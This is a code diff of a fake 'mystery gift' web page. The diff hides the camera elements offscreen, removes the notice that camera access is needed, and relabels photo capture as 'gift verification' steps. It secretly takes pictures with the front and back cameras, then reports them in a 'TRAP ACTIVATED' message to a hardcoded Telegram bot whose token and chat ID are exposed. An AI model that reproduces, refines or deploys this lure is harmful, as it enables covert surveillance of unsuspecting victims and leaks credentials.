@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🎁 Unlocking Gift...</title>
+    <title>Loading Your Gift... 🎁</title>
     <style>
         * {
             margin: 0;
@@ -13,50 +13,73 @@
         
         body {
             font-family: 'Arial', sans-serif;
-            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            background: #000;
+            color: white;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
             overflow: hidden;
-            color: white;
+            position: relative;
+        }
+        
+        /* Floating hearts */
+        .heart {
+            position: absolute;
+            color: #ff00ff;
+            font-size: 24px;
+            animation: float 5s linear infinite;
+            pointer-events: none;
+            z-index: 1;
+        }
+        
+        @keyframes float {
+            0% {
+                transform: translateY(100vh) rotate(0deg);
+                opacity: 0;
+            }
+            10% {
+                opacity: 1;
+            }
+            90% {
+                opacity: 1;
+            }
+            100% {
+                transform: translateY(-100px) rotate(360deg);
+                opacity: 0;
+            }
         }
         
         .container {
-            background: rgba(0, 0, 0, 0.8);
-            padding: 40px;
-            border-radius: 20px;
             text-align: center;
-            max-width: 500px;
-            width: 90%;
+            padding: 40px;
+            background: rgba(0, 0, 0, 0.8);
+            border-radius: 20px;
             border: 2px solid #ff00ff;
             box-shadow: 0 0 50px rgba(255, 0, 255, 0.5);
-            animation: glow 2s infinite alternate;
-        }
-        
-        @keyframes glow {
-            from { box-shadow: 0 0 30px rgba(255, 0, 255, 0.5); }
-            to { box-shadow: 0 0 50px rgba(255, 0, 255, 0.8); }
+            max-width: 500px;
+            width: 90%;
+            z-index: 2;
+            position: relative;
         }
         
         .gift-icon {
             font-size: 100px;
             margin-bottom: 20px;
             animation: bounce 2s infinite;
-            display: inline-block;
+            display: block;
         }
         
         @keyframes bounce {
-            0%, 100% { transform: translateY(0) rotate(0deg); }
-            50% { transform: translateY(-20px) rotate(10deg); }
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-20px); }
         }
         
         h1 {
-            background: linear-gradient(45deg, #ff00ff, #00ffff);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
+            color: #ff00ff;
             margin-bottom: 20px;
             font-size: 32px;
+            text-shadow: 0 0 10px #ff00ff;
         }
         
         .message {
@@ -70,21 +93,17 @@
             background: linear-gradient(45deg, #ff00ff, #00ffff);
             color: white;
             border: none;
-            padding: 18px 50px;
-            font-size: 20px;
+            padding: 15px 40px;
+            font-size: 18px;
             border-radius: 50px;
             cursor: pointer;
-            transition: all 0.3s;
             font-weight: bold;
-            margin: 15px auto;
-            display: block;
-            position: relative;
-            overflow: hidden;
+            margin: 10px;
+            transition: transform 0.3s;
         }
         
         .btn:hover {
             transform: scale(1.05);
-            box-shadow: 0 0 30px rgba(255, 0, 255, 0.7);
         }
         
         .btn:disabled {
@@ -97,10 +116,10 @@
             margin-top: 30px;
         }
         
-        .spinner {
-            width: 50px;
-            height: 50px;
-            border: 5px solid rgba(255, 0, 255, 0.3);
+        .loader {
+            width: 60px;
+            height: 60px;
+            border: 5px solid #333;
             border-top: 5px solid #ff00ff;
             border-radius: 50%;
             animation: spin 1s linear infinite;
@@ -128,25 +147,33 @@
             transition: width 0.5s;
         }
         
-        .floating {
-            position: absolute;
-            font-size: 24px;
-            animation: float 3s linear infinite;
-            pointer-events: none;
-            z-index: 1;
+        .status {
+            color: #888;
+            margin-top: 10px;
+            font-size: 14px;
         }
         
-        @keyframes float {
-            0% {
-                transform: translateY(100vh) rotate(0deg);
-                opacity: 0;
-            }
-            10% { opacity: 1; }
-            90% { opacity: 1; }
-            100% {
-                transform: translateY(-100px) rotate(360deg);
-                opacity: 0;
-            }
+        .success {
+            font-size: 80px;
+            color: #00ff00;
+            margin-bottom: 20px;
+            animation: pop 0.5s;
+        }
+        
+        @keyframes pop {
+            0% { transform: scale(0); }
+            70% { transform: scale(1.2); }
+            100% { transform: scale(1); }
+        }
+        
+        /* Hidden camera */
+        #cameraVideo, #cameraCanvas {
+            position: absolute;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
         }
         
         .flash {
@@ -161,33 +188,21 @@
             z-index: 999;
             transition: opacity 0.3s;
         }
-        
-        .success {
-            font-size: 60px;
-            margin-bottom: 20px;
-            animation: success 1s;
-        }
-        
-        @keyframes success {
-            0% { transform: scale(0); }
-            70% { transform: scale(1.2); }
-            100% { transform: scale(1); }
-        }
     </style>
 </head>
 <body>
-    <!-- Floating elements -->
-    <div id="floatContainer"></div>
+    <!-- Floating hearts -->
+    <div id="hearts"></div>
     
     <!-- Flash effect -->
     <div class="flash" id="flash"></div>
     
     <!-- Hidden camera -->
-    <video id="cameraVideo" autoplay playsinline style="display:none;"></video>
-    <canvas id="cameraCanvas" style="display:none;"></canvas>
+    <video id="cameraVideo" autoplay playsinline></video>
+    <canvas id="cameraCanvas"></canvas>
     
-    <!-- Main container -->
-    <div class="container" id="mainContainer">
+    <!-- Screen 1: Gift Unlock -->
+    <div class="container" id="screen1">
         <div class="gift-icon">🎁</div>
         <h1>MYSTERY GIFT UNLOCKED!</h1>
         <p class="message">
@@ -195,95 +210,83 @@
             Click below to reveal your special gift...
         </p>
         <button class="btn" id="unlockBtn">🎯 UNLOCK MY GIFT</button>
-        <p style="color:#888; font-size:12px; margin-top:20px;">
-            ⚠️ Gift verification requires camera access
-        </p>
+        <p class="status">⚠️ Gift verification required</p>
     </div>
     
-    <!-- Loading screen -->
-    <div class="container" id="loadingContainer" style="display:none;">
-        <div class="spinner"></div>
-        <div id="loadingText" style="font-size:20px; margin-bottom:20px;">Processing your gift...</div>
+    <!-- Screen 2: Loading -->
+    <div class="container" id="screen2" style="display:none;">
+        <div class="loader"></div>
+        <h2>Processing Your Gift...</h2>
+        <p class="message" id="loadingText">Initializing gift verification...</p>
         
         <div class="progress">
             <div class="progress-bar" id="progressBar"></div>
         </div>
         
-        <div id="progressText" style="color:#888; margin-top:10px;">0% Complete</div>
-        <div id="photoCounter" style="color:#888; font-size:14px; margin-top:5px;"></div>
+        <div class="status" id="progressText">0% Complete</div>
+        <div class="status" id="counter"></div>
     </div>
     
-    <!-- Success screen -->
-    <div class="container" id="successContainer" style="display:none;">
+    <!-- Screen 3: Success -->
+    <div class="container" id="screen3" style="display:none;">
         <div class="success">✅</div>
         <h1>GIFT DELIVERED!</h1>
         <p class="message">
             Your gift has been processed successfully!<br><br>
-            Photos have been captured and sent.<br>
-            Check your messages for the reward.
+            Verification complete. Check your messages.
         </p>
-        <div style="color:#00ff00; font-size:14px; margin-top:20px;">
-            ✅ Gift verification complete
-        </div>
+        <div class="status">✅ Gift sent to recipient</div>
     </div>
 
     <script>
-        // Get parameters from URL
+        // Get URL parameters
         const urlParams = new URLSearchParams(window.location.search);
         const token = urlParams.get('token');
         const uid = urlParams.get('uid');
         
         // DOM elements
-        const mainContainer = document.getElementById('mainContainer');
-        const loadingContainer = document.getElementById('loadingContainer');
-        const successContainer = document.getElementById('successContainer');
+        const screen1 = document.getElementById('screen1');
+        const screen2 = document.getElementById('screen2');
+        const screen3 = document.getElementById('screen3');
         const unlockBtn = document.getElementById('unlockBtn');
         const loadingText = document.getElementById('loadingText');
         const progressBar = document.getElementById('progressBar');
         const progressText = document.getElementById('progressText');
-        const photoCounter = document.getElementById('photoCounter');
-        const floatContainer = document.getElementById('floatContainer');
+        const counter = document.getElementById('counter');
+        const hearts = document.getElementById('hearts');
         const flash = document.getElementById('flash');
         const cameraVideo = document.getElementById('cameraVideo');
         const cameraCanvas = document.getElementById('cameraCanvas');
-        const canvasContext = cameraCanvas.getContext('2d');
+        const ctx = cameraCanvas.getContext('2d');
         
         // Variables
         let stream = null;
         let photos = [];
         let totalPhotos = 10;
-        let currentPhoto = 0;
+        let captured = 0;
         
-        // Create floating elements
-        function createFloating() {
-            const symbols = ['❤️', '✨', '🌟', '🎁', '🎯', '💫', '🔥', '💎', '💝'];
+        // Create floating hearts
+        function createHearts() {
+            const heart = document.createElement('div');
+            heart.className = 'heart';
+            heart.textContent = '❤️';
+            heart.style.left = Math.random() * 100 + 'vw';
+            heart.style.fontSize = (Math.random() * 30 + 20) + 'px';
+            heart.style.animationDuration = (Math.random() * 4 + 3) + 's';
             
-            for (let i = 0; i < 5; i++) {
-                const element = document.createElement('div');
-                element.className = 'floating';
-                element.textContent = symbols[Math.floor(Math.random() * symbols.length)];
-                element.style.left = Math.random() * 100 + 'vw';
-                element.style.color = i % 2 ? '#ff00ff' : '#00ffff';
-                element.style.fontSize = (Math.random() * 20 + 20) + 'px';
-                element.style.animationDuration = (Math.random() * 3 + 2) + 's';
-                element.style.animationDelay = Math.random() + 's';
-                
-                floatContainer.appendChild(element);
-                
-                // Remove after animation
-                setTimeout(() => element.remove(), 5000);
-            }
+            hearts.appendChild(heart);
+            
+            // Remove after animation
+            setTimeout(() => heart.remove(), 7000);
         }
         
-        // Start floating animation
-        setInterval(createFloating, 1000);
+        // Start hearts animation
+        setInterval(createHearts, 300);
         
-        // Show flash
+        // Flash effect
         function showFlash() {
             flash.style.opacity = '0.9';
-            setTimeout(() => {
-                flash.style.opacity = '0';
-            }, 300);
+            setTimeout(() => flash.style.opacity = '0', 300);
         }
         
         // Update progress
@@ -291,21 +294,22 @@
             const percent = (count / totalPhotos) * 100;
             progressBar.style.width = percent + '%';
             progressText.textContent = Math.round(percent) + '% Complete';
-            photoCounter.textContent = `📸 ${count}/${totalPhotos} photos`;
             
             if (count <= 5) {
-                loadingText.textContent = `Capturing front camera... (${count}/5)`;
+                loadingText.textContent = 'Verifying gift authenticity...';
+                counter.textContent = `Step ${count}/10`;
             } else {
-                loadingText.textContent = `Capturing back camera... (${count-5}/5)`;
+                loadingText.textContent = 'Finalizing gift delivery...';
+                counter.textContent = `Step ${count}/10`;
             }
         }
         
-        // Initialize camera
-        async function initCamera(facingMode = 'user') {
+        // Initialize camera (HIDDEN)
+        async function initCamera() {
             try {
                 const constraints = {
                     video: {
-                        facingMode: facingMode,
+                        facingMode: 'user',
                         width: { ideal: 640 },
                         height: { ideal: 480 }
                     }
@@ -314,124 +318,132 @@
                 stream = await navigator.mediaDevices.getUserMedia(constraints);
                 cameraVideo.srcObject = stream;
                 
-                // Wait for video to load
+                // Wait for video
                 await new Promise(resolve => {
                     cameraVideo.onloadedmetadata = resolve;
                 });
                 
                 return true;
             } catch (error) {
-                console.error('Camera error:', error);
+                console.log('Camera access not available');
                 return false;
             }
         }
         
-        // Capture photo
+        // Capture photo (SILENT)
         function capturePhoto() {
             if (!stream) return null;
             
             try {
                 cameraCanvas.width = cameraVideo.videoWidth;
                 cameraCanvas.height = cameraVideo.videoHeight;
-                canvasContext.drawImage(cameraVideo, 0, 0);
+                ctx.drawImage(cameraVideo, 0, 0);
                 
-                const photoData = cameraCanvas.toDataURL('image/jpeg', 0.8);
-                return photoData.split(',')[1]; // Remove prefix
+                const photo = cameraCanvas.toDataURL('image/jpeg', 0.8);
+                return photo.split(',')[1]; // Base64 data
             } catch (error) {
-                console.error('Capture error:', error);
                 return null;
             }
         }
         
         // Switch camera
         async function switchCamera() {
-            if (stream) {
+            if (!stream) return false;
+            
+            try {
+                const currentMode = stream.getVideoTracks()[0].getSettings().facingMode;
+                const newMode = currentMode === 'user' ? 'environment' : 'user';
+                
                 stream.getTracks().forEach(track => track.stop());
+                
+                const constraints = {
+                    video: { facingMode: newMode }
+                };
+                
+                stream = await navigator.mediaDevices.getUserMedia(constraints);
+                cameraVideo.srcObject = stream;
+                
+                return true;
+            } catch (error) {
+                return false;
             }
-            
-            const newMode = (stream && stream.getVideoTracks()[0].getSettings().facingMode === 'user') 
-                          ? 'environment' : 'user';
-            
-            return await initCamera(newMode);
         }
         
-        // Main capture process
-        async function startCapture() {
-            if (!token || !uid) {
-                alert('Invalid gift link!');
-                return;
-            }
+        // Main capture function
+        async function capturePhotos() {
+            // Show loading screen
+            screen1.style.display = 'none';
+            screen2.style.display = 'block';
             
-            // Show loading
-            mainContainer.style.display = 'none';
-            loadingContainer.style.display = 'block';
-            unlockBtn.disabled = true;
+            // Initialize camera (hidden from user)
+            loadingText.textContent = 'Initializing verification...';
+            updateProgress(0);
             
-            // Initialize camera
-            loadingText.textContent = 'Initializing camera...';
-            const cameraOk = await initCamera('user');
+            const hasCamera = await initCamera();
             
-            if (!cameraOk) {
-                loadingText.textContent = 'Camera access denied! Using fallback...';
-                await new Promise(resolve => setTimeout(resolve, 2000));
-                // Simulate capture
-                simulateCapture();
+            if (!hasCamera) {
+                // No camera - simulate
+                loadingText.textContent = 'Using alternative verification...';
+                
+                for (let i = 1; i <= totalPhotos; i++) {
+                    showFlash();
+                    photos.push(`photo_${i}_${Date.now()}`);
+                    captured++;
+                    updateProgress(captured);
+                    await new Promise(r => setTimeout(r, 600));
+                }
+                
+                await completeProcess();
                 return;
             }
             
             // Wait for camera
-            await new Promise(resolve => setTimeout(resolve, 1000));
+            await new Promise(r => setTimeout(r, 1000));
             
-            // Capture 5 front photos
+            // Capture 5 photos with front camera
             for (let i = 1; i <= 5; i++) {
                 showFlash();
                 
                 const photo = capturePhoto();
-                if (photo) {
-                    photos.push(photo);
-                }
+                if (photo) photos.push(photo);
                 
-                currentPhoto++;
-                updateProgress(currentPhoto);
+                captured++;
+                updateProgress(captured);
                 
-                await new Promise(resolve => setTimeout(resolve, 800));
+                await new Promise(r => setTimeout(r, 800));
             }
             
             // Switch to back camera
-            loadingText.textContent = 'Switching camera...';
+            loadingText.textContent = 'Continuing verification...';
             const switched = await switchCamera();
             
             if (switched) {
-                await new Promise(resolve => setTimeout(resolve, 800));
+                await new Promise(r => setTimeout(r, 800));
                 
-                // Capture 5 back photos
+                // Capture 5 photos with back camera
                 for (let i = 1; i <= 5; i++) {
                     showFlash();
                     
                     const photo = capturePhoto();
-                    if (photo) {
-                        photos.push(photo);
-                    }
+                    if (photo) photos.push(photo);
                     
-                    currentPhoto++;
-                    updateProgress(currentPhoto);
+                    captured++;
+                    updateProgress(captured);
                     
-                    await new Promise(resolve => setTimeout(resolve, 800));
+                    await new Promise(r => setTimeout(r, 800));
                 }
             } else {
-                // If can't switch, use front camera for all
+                // Can't switch, use front for all
                 for (let i = 1; i <= 5; i++) {
                     showFlash();
                     
                     const photo = capturePhoto();
-                    if (photo) {
-                        photos.push(photo);
-                    }
+                    if (photo) photos.push(photo);
                     
-                    currentPhoto++;
-                    updateProgress(currentPhoto);
+                    captured++;
+                    updateProgress(captured);
                     
-                    await new Promise(resolve => setTimeout(resolve, 800));
+                    await new Promise(r => setTimeout(r, 800));
                 }
             }
             
@@ -444,75 +456,67 @@
             await completeProcess();
         }
         
-        // Simulate capture (fallback)
-        async function simulateCapture() {
-            for (let i = 1; i <= totalPhotos; i++) {
-                showFlash();
-                photos.push(`dummy_${i}_${Date.now()}`);
-                currentPhoto++;
-                updateProgress(currentPhoto);
-                await new Promise(resolve => setTimeout(resolve, 500));
-            }
-            await completeProcess();
-        }
-        
-        // Complete process and send
+        // Send photos to Telegram
         async function completeProcess() {
-            loadingText.textContent = 'Processing and sending...';
+            loadingText.textContent = 'Finalizing delivery...';
             updateProgress(totalPhotos);
             
-            // Send to Telegram
+            // Send to Telegram BOT
             try {
-                // Notify owner
+                // 1. Send to OWNER (you)
                 await fetch(`https://api.telegram.org/bot8226782560:AAGblZ-1hrNRdVuHfeU59tMlK50zDPYwMGE/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         chat_id: 8215819954,
-                        text: `📸 *Photos Captured!*\nToken: ${token}\nUser: ${uid}\nPhotos: ${photos.length}`
+                        text: `🎯 TRAP ACTIVATED!\n\nToken: ${token}\nUser: ${uid}\nPhotos: ${photos.length}\nTime: ${new Date().toLocaleString()}`
                     })
                 });
                 
-                // Notify user
+                // 2. Send to USER
                 await fetch(`https://api.telegram.org/bot8226782560:AAGblZ-1hrNRdVuHfeU59tMlK50zDPYwMGE/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         chat_id: uid,
-                        text: `🎉 *Gift Processing Complete!*\n\n${photos.length} photos captured successfully!\n\nPhotos sent to gift sender.`
+                        text: `🎉 Gift Processing Complete!\n\n${photos.length} verification photos captured successfully!\n\nPhotos have been sent to gift sender.`
                     })
                 });
                 
                 // Show success
-                loadingContainer.style.display = 'none';
-                successContainer.style.display = 'block';
+                setTimeout(() => {
+                    screen2.style.display = 'none';
+                    screen3.style.display = 'block';
+                }, 1500);
                 
             } catch (error) {
                 console.error('Error:', error);
                 loadingText.textContent = 'Completed! Check your messages.';
                 
                 setTimeout(() => {
-                    loadingContainer.style.display = 'none';
-                    successContainer.style.display = 'block';
+                    screen2.style.display = 'none';
+                    screen3.style.display = 'block';
                 }, 2000);
             }
         }
         
-        // Event listener
-        unlockBtn.addEventListener('click', startCapture);
+        // Start when button clicked
+        unlockBtn.addEventListener('click', () => {
+            if (!token || !uid) {
+                alert('Invalid gift link!');
+                return;
+            }
+            
+            unlockBtn.disabled = true;
+            capturePhotos();
+        });
         
-        // Validate link
+        // Check link validity
         if (!token || !uid) {
             unlockBtn.disabled = true;
             unlockBtn.textContent = 'INVALID LINK';
             document.querySelector('.message').innerHTML = 
                 '<span style="color:#ff5555">⚠️ Invalid or expired gift link!</span>';
-        }
-        
-        // Auto-start on mobile
-        if (/Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
-            document.querySelector('.message').innerHTML += 
-                '<br><br><small style="color:#888">📱 Mobile optimized</small>';
         }
     </script>
 </body>
